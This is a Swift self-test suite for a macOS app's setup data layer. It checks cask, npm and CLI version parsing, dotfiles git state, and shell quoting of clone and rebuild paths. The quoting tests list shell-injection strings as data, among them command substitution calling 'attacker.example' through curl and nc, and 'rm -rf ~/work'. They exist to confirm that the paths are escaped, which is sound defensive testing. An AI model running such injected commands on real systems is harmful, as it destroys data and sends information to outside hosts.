// Grand Line - native macOS app.
//
// First coverage for the Setup/Bootstrap data layer, which the full-app
// audit's §7 found had **none**: "`UpdatesData`, `DotfilesData`,
// `NotSyncedData`, `SudoTouchIDData`, `SetupStepChecks` shells out to real
// brew/git/av with no fake seam and has zero coverage."
//
// The reason it had none is real, not neglect: these functions run `brew`,
// `npm`, `git` and `av`. A suite that drove them would depend on - and could
// mutate - whatever the machine running it happens to have installed, which is
// not a trade worth making for a test.
//
// What is testable, and where every defect in this layer has actually been, is
// the **parsing and status-mapping** wrapped around those calls. That is pure,
// and it is guarded here by replacing the transport only - see
// `UpdatesDataTestSeam` / `DotfilesDataTestSeam`, which intercept the single
// `run`/`resolveExecutable` pair each file funnels through.
//
// Two of these cases are the two bugs this layer has actually shipped, both
// found live by hand with nothing to stop them returning:
//
//   * `no-mistakes --version` prints "no-mistakes version v1.37.0 …", so the
//     first "v" in the string is the one inside the *word* "version". The
//     original parser took it and crashed the check silently.
//   * `brew list --versions --cask` resolves an installed cask only by its
//     short token; the fully-qualified `owner/tap/name` form that `brew info`
//     and `brew upgrade` both accept returns exit 1 here even when the cask is
//     installed. Confirmed live against automic-vault at the time.
//
// The second is why this suite asserts the **arguments** as well as the parsed
// result: its entire symptom is the wrong argument being sent, which no
// assertion about the reply can see.
//
// A third shipped later, and it is why a cask's installed state is no longer
// asked of brew at all: a tap updated its cask to a DSL the captain's pinned
// Homebrew could not parse, every brew command on it exited 1, and an
// installed Automic Vault 4.18.0 read as "Not installed". The `cask*` cases
// below build a fake Caskroom and `/Applications` in a temporary directory -
// never the real ones - and assert installed state comes from there.
//
// Pure logic - no window, no real subprocess - so it runs in CI.
//
// Run with:
//   swift build && FM_RUN_SETUP_DATA_LAYER_TESTS=1 \
//     .build/debug/GrandLine; echo $?
//
// GL-27: compiled into debug builds only. Do not remove this guard -
// `Phase3PolishSelfTest` asserts every file in this directory carries it.
#if FM_SELFTESTS

import Foundation

enum SetupDataLayerSelfTest {

    static func run() -> Bool {
        let cases: [(String, () -> String?)] = [
            ("noMistakesVersionIgnoresTheDecoyVInTheWordVersion", test_noMistakesDecoyV),
            ("noMistakesReportsAnUpdateFromItsOwnBanner", test_noMistakesBanner),
            ("noMistakesWithNoBannerIsUpToDate", test_noMistakesNoBanner),
            ("aFullyQualifiedCaskIsFoundInTheCaskroomByItsShortToken", test_caskShortToken),
            ("aFullyQualifiedCaskIsTappedBeforeAnyLookup", test_caskEnsureTapped),
            ("aCaskOnDiskIsInstalledEvenWhenBrewCannotLoadIt", test_caskInstalledBrewFailing),
            ("aCaskOnDiskWithBrewWorkingIsUpToDate", test_caskInstalledUpToDate),
            ("aCaskOnDiskWithANewerReleaseHasAnUpdate", test_caskUpdateAvailable),
            ("anAppBundleAloneCountsAsInstalled", test_caskAppBundleOnly),
            ("aCaskAbsentEverywhereIsNotInstalled", test_caskAbsent),
            ("aFailedCaskUpgradeNamesBrewsOwnError", test_caskUpgradeFailureNamesTheError),
            ("npmVersionsMapOntoTheRightStatus", test_npmStatusMapping),
            ("aMissingToolIsAReportedFailureNotACrash", test_missingToolIsReported),
            ("aFailedCheckCarriesTheToolsRealOutput", test_failureCarriesLog),
            ("dotfilesReadsBranchRemoteAndDirtyFilesFromGit", test_dotfilesParsesGit),
            ("dotfilesReportsBehindOriginFromRevListCounts", test_dotfilesBehindOrigin),
            ("dotfilesSeamRecordsEveryConcurrentRead", test_dotfilesSeamIsThreadSafe),
            ("aSelfTestProcessNeverReadsTheCaptainsDotfiles", test_dotfilesLocationIsRedirected),
            ("aClonePathWithShellMetacharactersStaysOneLiteralArgument", test_clonePathIsShellQuoted),
            ("theRebuildCommandQuotesItsRepoPathToo", test_rebuildPathIsShellQuoted),
            ("shellQuoteSurvivesARoundTripThroughARealShell", test_shellQuoteRoundTripsThroughSh),
        ]
        var failures = 0
        for (name, testCase) in cases {
            UpdatesDataTestSeam.reset()
            DotfilesDataTestSeam.reset()
            if let failure = testCase() {
                print("FAIL \(name): \(failure)")
                failures += 1
            } else {
                print("PASS \(name)")
            }
        }
        UpdatesDataTestSeam.reset()
        DotfilesDataTestSeam.reset()
        for root in fixtureRoots { try? FileManager.default.removeItem(at: root) }
        fixtureRoots = []
        print(failures == 0
            ? "SetupDataLayerSelfTest: all \(cases.count) cases passed"
            : "SetupDataLayerSelfTest: \(failures)/\(cases.count) cases FAILED")
        return failures == 0
    }

    // MARK: Fakes

    private static func result(_ stdout: String, stderr: String = "", status: Int32 = 0) -> SubprocessResult {
        SubprocessResult(outcome: .exited, status: status,
                         stdoutData: Data(stdout.utf8), stderrData: Data(stderr.utf8),
                         duration: 0)
    }

    /// Installs a fake transport for `UpdatesData`. `replies` is matched on the
    /// first argument (the subcommand), which is what distinguishes the two or
    /// three calls a single `check` makes; anything unmatched comes back as a
    /// clean empty success rather than a failure, so a case only has to state
    /// the calls it actually cares about.
    private static func fakeUpdates(_ replies: [String: SubprocessResult],
                                    resolve: @escaping (String) -> String? = { "/usr/local/bin/\($0)" }) {
        UpdatesDataTestSeam.resolveExecutable = resolve
        // Every case reads a Caskroom and an /Applications, and must never
        // read the machine's real ones. An empty fixture is the default; the
        // cask cases fill theirs in with `installCaskFixture`.
        let root = fixtureRoot()
        UpdatesDataTestSeam.homebrewPrefixes = [root.appendingPathComponent("homebrew")]
        UpdatesDataTestSeam.applicationsDirectory = root.appendingPathComponent("Applications")
        UpdatesDataTestSeam.run = { _, args, _ in
            for (key, value) in replies where args.first == key { return value }
            return result("")
        }
    }

    private static func args(matching first: String) -> [String]? {
        UpdatesDataTestSeam.invocations.first { $0.args.first == first }?.args
    }

    // MARK: no-mistakes

    /// The decoy-"v" bug. `"no-mistakes version v1.37.0 …"` must parse to
    /// 1.37.0 - a parser taking the first bare "v" reads the one in "version".
    private static func test_noMistakesDecoyV() -> String? {
        fakeUpdates(["--version": result("no-mistakes version v1.37.0 (78e4dcb) 2026-07-13T03:11:57Z")])
        let outcome = UpdatesSource.check(DependencyItem(id: "nm", name: "no-mistakes",
                                                        category: "Other", kind: .noMistakes))
        guard outcome.status != .checkFailed else {
            return "the version line did not parse at all (\(outcome.detail)) - this is the decoy-'v' bug: "
                 + "the first 'v' in the output is the one inside the word 'version'"
        }
        guard outcome.installedLabel == "1.37.0" else {
            return "expected installed 1.37.0, got \(outcome.installedLabel)"
        }
        return nil
    }

    private static func test_noMistakesBanner() -> String? {
        fakeUpdates([
            "--version": result("no-mistakes version v1.37.0 (78e4dcb) 2026-07-13T03:11:57Z"),
            "doctor": result("", stderr: "A new version of no-mistakes is available: v1.37.0 -> v1.40.2"),
        ])
        let outcome = UpdatesSource.check(DependencyItem(id: "nm", name: "no-mistakes",
                                                        category: "Other", kind: .noMistakes))
        guard outcome.status == .updateAvailable else {
            return "expected .updateAvailable from the banner, got \(outcome.status) (\(outcome.detail))"
        }
        guard outcome.latestLabel == "1.40.2" else {
            return "expected latest 1.40.2 from the banner, got \(outcome.latestLabel ?? "nil")"
        }
        return nil
    }

    /// No banner is how this tool says "you are current" - it must not be read
    /// as a failed check.
    private static func test_noMistakesNoBanner() -> String? {
        fakeUpdates([
            "--version": result("no-mistakes version v1.40.2 (aaaaaaa) 2026-07-13T03:11:57Z"),
            "doctor": result("usage: no-mistakes doctor"),
        ])
        let outcome = UpdatesSource.check(DependencyItem(id: "nm", name: "no-mistakes",
                                                        category: "Other", kind: .noMistakes))
        guard outcome.status == .upToDate else {
            return "no banner means up to date, got \(outcome.status) (\(outcome.detail))"
        }
        return nil
    }

    // MARK: Homebrew cask

    /// The fully-qualified-cask bug in its current form: the Caskroom folder
    /// is named by the short token, so looking up `owner/tap/name` there
    /// would find nothing on a machine where the cask is installed.
    private static func test_caskShortToken() -> String? {
        fakeUpdates(["info": result(#"{"casks":[{"version":"2.11.0"}]}"#)])
        installCaskFixture(token: "automic-vault", versions: ["2.10.0"])
        let outcome = UpdatesSource.check(automicVault)
        guard outcome.installedLabel == "2.10.0" else {
            return "a cask installed under Caskroom/automic-vault was not found for the fully-qualified "
                 + "token automic-vault/isotopes/automic-vault - got \(outcome.installedLabel) (\(outcome.status))"
        }
        guard args(matching: "list") == nil else {
            return "a cask's installed state must not be asked of `brew list` - it has to load the cask's "
                 + "definition and fails when a tap ships one this Homebrew cannot parse"
        }
        return nil
    }

    /// A fully-qualified cask's tap has to exist before any other brew
    /// subcommand can resolve it, so the tap is a no-op-once-tapped
    /// precondition rather than an optimisation.
    private static func test_caskEnsureTapped() -> String? {
        fakeUpdates(["list": result("automic-vault 2.10.0")])
        _ = UpdatesSource.check(DependencyItem(id: "av", name: "Automic Vault", category: "Security",
                                               kind: .brewCask(cask: "automic-vault/isotopes/automic-vault")))
        guard let tapArgs = args(matching: "tap") else {
            return "no `brew tap` call was made - a fully-qualified cask's tap must be ensured before lookup"
        }
        guard tapArgs.contains("automic-vault/isotopes") else {
            return "`brew tap` was asked for \(tapArgs) - expected the owner/tap portion"
        }
        return nil
    }

    private static let automicVault = DependencyItem(
        id: "av", name: "Automic Vault", category: "Security",
        kind: .brewCask(cask: "automic-vault/isotopes/automic-vault", app: "Automic Vault.app"))

    /// The exact reply the captain's Homebrew 6.0.1 gave for every command on
    /// the updated `automic-vault/isotopes` cask.
    private static let brewCannotLoadCask = result(
        "", stderr: "Error: Cask 'automic-vault' definition is invalid: undefined method 'run' for an instance of Homebrew::InstallSteps::DSL\nPlease report this issue.",
        status: 1)

    /// The regression itself. Before the fix this reported `.notInstalled`
    /// and the row offered "Install in Bootstrap" for an installed app.
    private static func test_caskInstalledBrewFailing() -> String? {
        fakeUpdates(["info": brewCannotLoadCask, "list": brewCannotLoadCask])
        installCaskFixture(token: "automic-vault", versions: ["4.9.0", "4.18.0"])
        let outcome = UpdatesSource.check(automicVault)
        guard outcome.status == .checkFailed else {
            return "an installed cask brew cannot load must be .checkFailed (installed, latest unknown) - got "
                 + "\(outcome.status) (\(outcome.detail)). .notInstalled here is the shipped bug"
        }
        guard outcome.installedLabel == "4.18.0" else {
            return "expected the newest Caskroom version 4.18.0 (numeric, not lexical, order), got \(outcome.installedLabel)"
        }
        guard outcome.detail == "Installed 4.18.0 - Homebrew could not read the latest version" else {
            return "unexpected detail: \(outcome.detail)"
        }
        guard outcome.log.contains("Homebrew error: Error: Cask 'automic-vault' definition is invalid") else {
            return "the log must carry brew's first error line so the captain can see why. Log: \(outcome.log)"
        }
        return nil
    }

    private static func test_caskInstalledUpToDate() -> String? {
        fakeUpdates(["info": result(#"{"casks":[{"version":"4.18.0"}]}"#)])
        installCaskFixture(token: "automic-vault", versions: ["4.18.0"])
        let outcome = UpdatesSource.check(automicVault)
        guard outcome.status == .upToDate, outcome.installedLabel == "4.18.0", outcome.latestLabel == "4.18.0" else {
            return "expected 4.18.0 up to date, got \(outcome.status) \(outcome.installedLabel) -> \(outcome.latestLabel ?? "nil")"
        }
        return nil
    }

    private static func test_caskUpdateAvailable() -> String? {
        fakeUpdates(["info": result(#"{"casks":[{"version":"4.19.0"}]}"#)])
        installCaskFixture(token: "automic-vault", versions: ["4.18.0"])
        let outcome = UpdatesSource.check(automicVault)
        guard outcome.status == .updateAvailable, outcome.installedLabel == "4.18.0", outcome.latestLabel == "4.19.0" else {
            return "expected 4.18.0 -> 4.19.0 update available, got \(outcome.status) \(outcome.installedLabel) -> \(outcome.latestLabel ?? "nil")"
        }
        return nil
    }

    /// The second source: an app in /Applications with no Caskroom entry.
    private static func test_caskAppBundleOnly() -> String? {
        fakeUpdates(["info": brewCannotLoadCask])
        installAppFixture(name: "Automic Vault.app", version: "4.17.2")
        let outcome = UpdatesSource.check(automicVault)
        guard outcome.status == .checkFailed, outcome.installedLabel == "4.17.2" else {
            return "an app bundle in /Applications must count as installed at its CFBundleShortVersionString, got "
                 + "\(outcome.status) \(outcome.installedLabel)"
        }
        return nil
    }

    /// The other direction: the fix must not turn absence into presence,
    /// whether or not brew can answer.
    private static func test_caskAbsent() -> String? {
        fakeUpdates(["info": result(#"{"casks":[{"version":"4.18.0"}]}"#)])
        let working = UpdatesSource.check(automicVault)
        guard working.status == .notInstalled, working.detail == "Not installed - 4.18.0 available" else {
            return "an absent cask with brew working must be .notInstalled, got \(working.status) (\(working.detail))"
        }
        UpdatesDataTestSeam.reset()
        fakeUpdates(["info": brewCannotLoadCask])
        let failing = UpdatesSource.check(automicVault)
        guard failing.status == .notInstalled else {
            return "an absent cask with brew failing must still be .notInstalled, got \(failing.status) (\(failing.detail))"
        }
        return nil
    }

    /// Update still goes through brew, and fails for a cask brew cannot
    /// load. The detail has to say why.
    private static func test_caskUpgradeFailureNamesTheError() -> String? {
        fakeUpdates(["upgrade": brewCannotLoadCask])
        installCaskFixture(token: "automic-vault", versions: ["4.18.0"])
        let outcome = UpdatesSource.update(automicVault)
        guard !outcome.ok else { return "a failed brew upgrade reported success" }
        guard outcome.detail == "brew upgrade automic-vault/isotopes/automic-vault failed: Error: Cask 'automic-vault' definition is invalid: undefined method 'run' for an instance of Homebrew::InstallSteps::DSL" else {
            return "the failure must name brew's first error line, got: \(outcome.detail)"
        }
        return nil
    }

    // MARK: Fixtures

    private static var fixtureRoots: [URL] = []

    /// One fresh directory per case, under the system temp directory, removed
    /// when the run ends.
    private static func fixtureRoot() -> URL {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("fm-setup-data-layer-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        fixtureRoots.append(root)
        return root
    }

    /// `<prefix>/Caskroom/<token>/<version>/` per version, plus brew's own
    /// `.metadata` folder, which must be ignored rather than read as a version.
    private static func installCaskFixture(token: String, versions: [String]) {
        guard let prefix = UpdatesDataTestSeam.homebrewPrefixes?.first else { return }
        let dir = prefix.appendingPathComponent("Caskroom").appendingPathComponent(token)
        for name in versions + [".metadata"] {
            try? FileManager.default.createDirectory(at: dir.appendingPathComponent(name),
                                                     withIntermediateDirectories: true)
        }
    }

    private static func installAppFixture(name: String, version: String) {
        guard let apps = UpdatesDataTestSeam.applicationsDirectory else { return }
        let contents = apps.appendingPathComponent(name).appendingPathComponent("Contents")
        try? FileManager.default.createDirectory(at: contents, withIntermediateDirectories: true)
        let plist: NSDictionary = ["CFBundleShortVersionString": version]
        plist.write(to: contents.appendingPathComponent("Info.plist"), atomically: true)
    }

    // MARK: npm and status mapping

    private static func test_npmStatusMapping() -> String? {
        let item = DependencyItem(id: "gh-axi", name: "gh-axi", category: "npm", kind: .npmGlobal(package: "gh-axi"))

        // Same version installed and latest -> up to date.
        fakeUpdates(["ls": result(#"{"dependencies":{"gh-axi":{"version":"1.2.3"}}}"#),
                     "view": result("1.2.3")])
        let same = UpdatesSource.check(item)
        guard same.status == .upToDate else {
            return "equal versions should be .upToDate, got \(same.status) (\(same.detail))"
        }

        // Newer available -> update available.
        UpdatesDataTestSeam.reset()
        fakeUpdates(["ls": result(#"{"dependencies":{"gh-axi":{"version":"1.2.3"}}}"#),
                     "view": result("1.3.0")])
        let newer = UpdatesSource.check(item)
        guard newer.status == .updateAvailable else {
            return "a newer latest should be .updateAvailable, got \(newer.status) (\(newer.detail))"
        }
        guard newer.installedLabel == "1.2.3", newer.latestLabel == "1.3.0" else {
            return "expected 1.2.3 -> 1.3.0, got \(newer.installedLabel) -> \(newer.latestLabel ?? "nil")"
        }
        return nil
    }

    // MARK: Failure paths

    /// A missing tool is an ordinary reported state. It must never be a crash,
    /// and must never be mistaken for "installed and current".
    private static func test_missingToolIsReported() -> String? {
        fakeUpdates([:], resolve: { _ in nil })
        for item in [DependencyItem(id: "a", name: "a", category: "npm", kind: .npmGlobal(package: "a")),
                     DependencyItem(id: "b", name: "b", category: "brew", kind: .brewFormula(formula: "b")),
                     DependencyItem(id: "c", name: "c", category: "brew", kind: .brewCask(cask: "c")),
                     DependencyItem(id: "d", name: "d", category: "Other", kind: .noMistakes)] {
            let outcome = UpdatesSource.check(item)
            guard outcome.status == .checkFailed else {
                return "with the tool missing from PATH, \(item.id) reported \(outcome.status) - "
                     + "must be .checkFailed, never a version claim"
            }
        }
        return nil
    }

    /// The row's expandable log is how a captain sees *why* something failed;
    /// dropping the tool's own output leaves an unactionable red pill.
    private static func test_failureCarriesLog() -> String? {
        fakeUpdates(["ls": result("", stderr: "npm ERR! code ENOTFOUND", status: 1),
                     "view": result("", stderr: "npm ERR! network", status: 1)])
        let outcome = UpdatesSource.check(DependencyItem(id: "x", name: "x", category: "npm",
                                                        kind: .npmGlobal(package: "x")))
        guard outcome.status == .checkFailed || outcome.status == .notInstalled else {
            return "a failing npm should not report success, got \(outcome.status)"
        }
        guard outcome.log.contains("npm ERR!") else {
            return "the failure dropped npm's own output - the row's log would be empty. Got: \(outcome.log)"
        }
        return nil
    }

    // MARK: DotfilesData

    /// Every git call in `DotfilesData` is `git -C <repo> <subcommand> ...`,
    /// so the subcommand is the *third* argument, not the first. Keying on
    /// `args.first` matches "-C" for all of them - which is why the handler is
    /// given the subcommand explicitly rather than the raw array.
    private static func fakeGit(_ handler: @escaping (String) -> SubprocessResult) {
        DotfilesDataTestSeam.run = { _, args, _ in
            handler(args.count > 2 ? args[2] : (args.first ?? ""))
        }
    }

    private static func test_dotfilesParsesGit() -> String? {
        fakeGit { subcommand in
            switch subcommand {
            case "rev-parse": return result("main")
            case "remote":      return result("git@github.com:manjesh-raj/manjesh-config.git")
            case "status":      return result(" M home.nix\n?? scratch.txt")
            default:            return result("")
            }
        }
        let state = DotfilesSource.repoState(at: "/tmp/not-a-real-repo")
        guard state.branch == "main" else { return "expected branch main, got \(state.branch ?? "nil")" }
        guard state.dirtyFiles.count == 2 else {
            return "expected 2 dirty files from `git status --short`, got \(state.dirtyFiles.count): \(state.dirtyFiles)"
        }
        return nil
    }

    /// `commitsBehindOrigin` is `nil` for "unknown" and a number for "known" -
    /// a distinction the Bootstrap drift card depends on (GL-14's rule: an
    /// unreachable remote must not read as "up to date").
    private static func test_dotfilesBehindOrigin() -> String? {
        fakeGit { subcommand in
            switch subcommand {
            case "rev-parse":  return result("main")
            case "remote":     return result("git@github.com:manjesh-raj/manjesh-config.git")
            case "status":     return result("")
            case "rev-list":   return result("13")
            default:           return result("")
            }
        }
        let behind = DotfilesSource.repoState(at: "/tmp/not-a-real-repo")
        guard behind.commitsBehindOrigin == 13 else {
            return "expected 13 commits behind from `git rev-list --count`, got "
                 + "\(behind.commitsBehindOrigin.map(String.init) ?? "nil")"
        }

        // A failed fetch/rev-list must report unknown, never zero.
        DotfilesDataTestSeam.reset()
        fakeGit { subcommand in
            switch subcommand {
            case "rev-parse":  return result("main")
            case "remote":     return result("git@github.com:manjesh-raj/manjesh-config.git")
            case "status":     return result("")
            case "fetch":      return result("", stderr: "could not resolve host", status: 128)
            case "rev-list":   return result("", stderr: "unknown revision", status: 128)
            default:           return result("")
            }
        }
        let unknown = DotfilesSource.repoState(at: "/tmp/not-a-real-repo")
        guard unknown.commitsBehindOrigin == nil else {
            return "an unreachable remote must report behind-count as unknown (nil), not "
                 + "\(unknown.commitsBehindOrigin.map(String.init) ?? "nil") - a confident 0 would read as up to date"
        }
        return nil
    }

    /// Bootstrap, Automation, the schedule runner and the signals poller each
    /// read the dotfiles repository on a queue of their own, and every read
    /// records itself in the seam. Unsynchronised, that append corrupted the
    /// heap: a review tour crashed in `Array.append` under
    /// `AutomationController.refreshDotfiles`. Every concurrent read must be
    /// recorded exactly once.
    private static func test_dotfilesSeamIsThreadSafe() -> String? {
        let repo = "/tmp/not-a-real-repo"
        fakeGit { _ in result("") }
        let threads = 8, perThread = 200
        DispatchQueue.concurrentPerform(iterations: threads) { _ in
            for _ in 0..<perThread { _ = DotfilesSource.repoState(at: repo) }
        }
        let recorded = DotfilesDataTestSeam.invocations.count
        // Every read makes the same calls, so measure one, serially.
        DotfilesDataTestSeam.reset()
        fakeGit { _ in result("") }
        _ = DotfilesSource.repoState(at: repo)
        let perRead = DotfilesDataTestSeam.invocations.count
        guard perRead > 0 else { return "a single read recorded nothing - the case is vacuous" }
        guard recorded == perRead * threads * perThread else {
            return "\(threads * perThread) concurrent reads recorded \(recorded) invocations, "
                 + "expected \(perRead * threads * perThread) - appends were lost"
        }
        return nil
    }

    /// A suite or a tour must never read the captain's real `~/.dotfiles`,
    /// because `repoState` runs a real `git fetch origin` against it. The
    /// resolver's order first, against fixed environments so the answer is
    /// the same on every machine, then this process's own answer, which is
    /// what `main.swift`'s redirect block decides.
    private static func test_dotfilesLocationIsRedirected() -> String? {
        let real = (DotfilesSource.dotfilesMarker as NSString).expandingTildeInPath
        let root = "/tmp/gl-dotfiles-root", narrow = "/tmp/gl-dotfiles-narrow"
        let variable = DotfilesSource.locationOverrideVariable
        let bare = DotfilesSource.dotfilesLocation([:])
        guard bare == real else { return "with nothing set the checkout is \(bare), want \(real)" }
        let underRoot = DotfilesSource.dotfilesLocation([AppPaths.scratchRootVariable: root])
        guard underRoot == root + "/dotfiles" else {
            return "under FM_SCRATCH_ROOT the checkout is \(underRoot), want \(root)/dotfiles"
        }
        let both = DotfilesSource.dotfilesLocation([AppPaths.scratchRootVariable: root, variable: narrow])
        guard both == narrow else { return "\(variable) does not win over FM_SCRATCH_ROOT: \(both)" }

        let here = DotfilesSource.dotfilesLocation()
        guard here != real, !FileManager.default.fileExists(atPath: here) else {
            return "this self-test process reads its dotfiles from \(here) - main.swift's redirect block "
                 + "must point \(variable) at a scratch path that does not exist"
        }
        guard DotfilesSource.resolvedDotfilesPath() == nil else {
            return "this self-test process resolved a dotfiles checkout, so it would run git against it"
        }
        return nil
    }

    // MARK: S12 - shell quoting

    /// S12. `cloneAndBootstrapClicked` built
    /// `git clone <url> "<path>" && cd "<path>" && ./bootstrap.sh` and handed
    /// it to the Console tab, which types it into a real login shell. Double
    /// quotes do not stop a shell expanding `$(...)`, a backtick or `$VAR`,
    /// and the path comes from an editable text field.
    ///
    /// Reverting `cloneCommand` to the double-quoted form fails every
    /// assertion below.
    private static func test_clonePathIsShellQuoted() -> String? {
        let hostile = [
            "/tmp/a b/dotfiles",
            "/tmp/$(curl attacker.example)/dotfiles",
            "/tmp/`whoami`/dotfiles",
            "/tmp/x; rm -rf ~/work",
            "/tmp/$HOME/dotfiles",
            "/tmp/x && curl attacker.example",
            "/tmp/x|nc attacker.example 9999",
            "/tmp/it's/dotfiles",
        ]
        for path in hostile {
            let command = DotfilesRunCommand.cloneCommand(expandedPath: path)
            guard let failure = assertPathIsOneLiteralToken(path, in: command) else { continue }
            return "clone command for \(path.debugDescription): \(failure)"
        }
        return nil
    }

    private static func test_rebuildPathIsShellQuoted() -> String? {
        for path in ["/tmp/a b/dotfiles", "/tmp/$(id)/dotfiles", "/tmp/`id`", "/tmp/it's"] {
            let command = DotfilesRunCommand.rebuildCommand(repoPath: path)
            guard let failure = assertPathIsOneLiteralToken(path, in: command) else { continue }
            return "rebuild command for \(path.debugDescription): \(failure)"
        }
        return nil
    }

    /// The assertion that actually discriminates: ask a **real** `/bin/sh` to
    /// parse the generated command and print the tokens it saw. A quoting bug
    /// shows up as the shell running something, or as the path arriving in
    /// more than one piece - neither of which a string comparison against an
    /// expected literal would notice, because that would just re-derive the
    /// function under test.
    ///
    /// `git`/`cd` are replaced by a shell function that echoes its argv, so
    /// nothing is cloned and no directory is entered.
    private static func test_shellQuoteRoundTripsThroughSh() -> String? {
        let cases = [
            "/tmp/a b/dotfiles",
            "/tmp/$(echo INJECTED)/dotfiles",
            "/tmp/`echo INJECTED`",
            "/tmp/x; echo INJECTED",
            "/tmp/$HOME",
            "/tmp/it's",
            "/tmp/quote\"and'both",
        ]
        for path in cases {
            let quoted = ShellQuote.posix(path)
            // `printf %s` writes exactly the one argument the shell parsed,
            // with no trailing newline - so a split token or an expansion is
            // visible as a difference in the bytes that come back.
            let script = "printf %s \(quoted)"
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/bin/sh")
            process.arguments = ["-c", script]
            let pipe = Pipe()
            process.standardOutput = pipe
            process.standardError = Pipe()
            do { try process.run() } catch { return "could not run /bin/sh: \(error)" }
            let data = pipe.fileHandleForReading.readDataToEndOfFile()
            process.waitUntilExit()
            let echoed = String(data: data, encoding: .utf8) ?? ""
            guard echoed == path else {
                return "a real /bin/sh read \(quoted) back as \(echoed.debugDescription), not \(path.debugDescription)"
            }
        }
        return nil
    }

    /// `nil` when `path` appears in `command` only as a single-quoted literal
    /// token and nothing outside those tokens could expand.
    private static func assertPathIsOneLiteralToken(_ path: String, in command: String) -> String? {
        let quoted = ShellQuote.posix(path)
        guard command.contains(quoted) else {
            return "the path is not present as the single-quoted token \(quoted) - command was \(command.debugDescription)"
        }
        guard !command.contains("\"\(path)\"") else {
            return "the path is still double-quoted, which a shell expands - command was \(command.debugDescription)"
        }
        // Whatever is left once every single-quoted run is removed is the
        // command's own fixed scaffolding, and must hold none of the path's
        // dangerous characters.
        var outside = ""
        var inQuotes = false
        for character in command {
            if character == "'" { inQuotes.toggle(); continue }
            if !inQuotes { outside.append(character) }
        }
        for dangerous in ["$", "`", ";", "|"] where outside.contains(dangerous) {
            return "\(dangerous) survived outside the quoted token - command was \(command.debugDescription)"
        }
        return nil
    }
}

#endif
